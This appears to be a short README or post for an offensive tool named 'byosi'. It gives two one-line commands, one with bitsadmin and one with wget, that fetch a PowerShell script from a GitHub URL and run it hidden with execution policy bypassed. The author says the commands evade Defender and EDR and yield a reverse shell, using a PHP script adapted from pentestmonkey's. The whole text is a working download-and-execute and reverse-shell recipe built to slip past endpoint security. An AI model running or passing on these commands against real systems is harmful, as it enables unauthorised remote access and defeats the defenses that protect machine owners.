Tested with defender and EDR.

I believe the first worked with defender the second worked on EDR (I won't state the solution).

* Method 1
 bitsadmin /transfer myDownloadJob /download /priority high https://raw.githubusercontent.com/fuzzlove/byosi/refs/heads/main/byosi.ps1 %temp%\myscript.ps1 & powershell -exec bypass -nop -w hidden -file %temp%\myscript.ps1

* Method 2
wget https://raw.githubusercontent.com/fuzzlove/byosi/refs/heads/main/byosi.ps1 -o byosipoc.ps1;./byosipoc.ps1

- The powershell script just needs to be modified with your settings.
- The php script has been modified and completely updated from pentestmonkeys good ole' script and just needs to be updated with settings.

If properly implemented this will give you a reverse shell on a system with EDR.

Best of luck!
